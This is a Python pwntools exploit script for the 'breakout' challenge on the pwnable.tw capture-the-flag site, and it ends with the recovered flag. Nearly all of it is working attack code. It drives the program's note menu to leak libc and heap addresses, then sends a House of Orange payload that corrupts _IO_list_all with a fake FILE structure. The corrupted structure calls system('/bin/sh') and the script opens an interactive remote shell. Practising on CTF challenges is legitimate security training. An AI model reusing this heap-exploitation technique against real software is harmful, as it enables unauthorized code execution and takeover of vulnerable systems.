from pwn import *


# Use -> house_of_orange technic!!


def list_(until=False):
    r.recvuntil('> ')
    r.sendline('list')

    if until is not False:
        r.recvuntil(until)


def note(cell, size, data):
    r.recvuntil('> ')
    r.sendline('note')
    r.recvuntil('Cell: ')
    r.sendline(str(cell))
    r.recvuntil('Size: ')
    r.sendline(str(size))
    r.recvuntil('Note: ')
    r.send(data)


def punish(cell):
    r.recvuntil('> ')
    r.sendline('punish')
    r.recvuntil('Cell: ')
    r.sendline(str(cell))


'''
   typedef struct prisoner_s {
           const char *risk;
           char *name;
           char *aka;
           uint32_t age;
           uint32_t cell;
       char *sentence;
           uint32_t note_size;
       char *note;
       struct prisoner_s *next;
   } Prisoner;
   '''

elf = ELF("breakout")
libc = ELF("libc_64.so.6")
r = remote('chall.pwnable.tw', 10400)

with log.progress("leaking address") as l:
    note(0, 100, 'A')
    note(1, 100, 'B')
    note(2, 100, 'C')
    note(3, 100, 'D')
    note(0, 200, 'a')
    note(2, 200, 'c')
    note(8, 0x200, '8')
    note(9, 100, '9')  # heap address leak from fastbin
    note(0, 0x150, '0' * 0x150)
    note(2, 0x200, '2')
    note(5, 0x80, 'q' * 0x8)
    l.status("note added")

    list_('q' * 0x8)
    libc_leak = u64(r.recv(6).ljust(8, b'\x00'))
    libc_base = libc_leak - 0x3c4d08 + 0x1000
    log.success("libc_base --> %s" % hex(libc_base))
    list_("Sentence: Life imprisonment, guilty for more than 26 contract kills\nNote: ")
    heap_leak = u64(r.recv(6).ljust(8, b'\x00'))
    heap_base = heap_leak - 0x12439
    log.success("heap_base --> %s" % hex(heap_base))

    system = libc_base + libc.symbols['system']
    _IO_list_all = libc_base + libc.symbols['_IO_list_all']
    note(8, 0x1000, 'Make_unsortedbin!!')
    punish(0)
    l.success()

with log.progress("sending payload") as l:
    l.status("first payload")
    payload = p64(0xffffffffffffffff) + p64(heap_base + 0x11ce0) + p64(heap_base + 0x11d00)
    payload += p32(0x28) + p32(0x0)
    payload += p64(heap_base + 0x11d20)
    payload += p64(0x1000)
    payload += p64(heap_base + 0x12680)  # sentence -> unsorted bin
    note(7, 0x40, payload)

    l.status("payload 2")
    payload = b"/bin/sh\x00" + p64(0x61)  # top top[1]

    payload += p64(_IO_list_all - 0x9a8) + p64(_IO_list_all - 0x10)  # top[2] top[3]
    payload += p64(0x0) + p64(0x0)  # top[4] top[5]
    payload += p64(0x0) + p64(0x0)  # top[6] top[7]
    payload += p64(0x0) + p64(0x0)  # top[8] top[9]
    payload += p64(0x0) + p64(0x0)  # top[10] top[11]
    payload += p64(0x0) + p64(0x0)  # top[12] top[13]
    payload += p64(0x0) + p64(system)  # top[14] top[15]
    payload += p64(0x0) + p64(0x0)  # top[16] top[17]
    payload += p64(0x0) + p64(0x0)  # top[18] top[19]
    payload += p64(heap_base + 0x12710) + p64(0x2)  # top[20] top[21]
    payload += p64(0x3) + p64(0x0)  # top[22] top[23]
    payload += p64(0x1) + p64(0x0)  # top[24] top[25]
    payload += p64(0x0) + p64(heap_base + 0x126e0)  # top[26] top[27]

    note(0, len(payload), payload)

    r.recvuntil('>')
    r.sendline('note')
    r.recvuntil('Cell: ')
    r.sendline('6')
    r.sendline('30')
    l.success()
    r.recvuntil("Size: ")
    r.interactive()

# FLAG --> FLAG{Br3ak_0ut_7He_Pr1s0N}
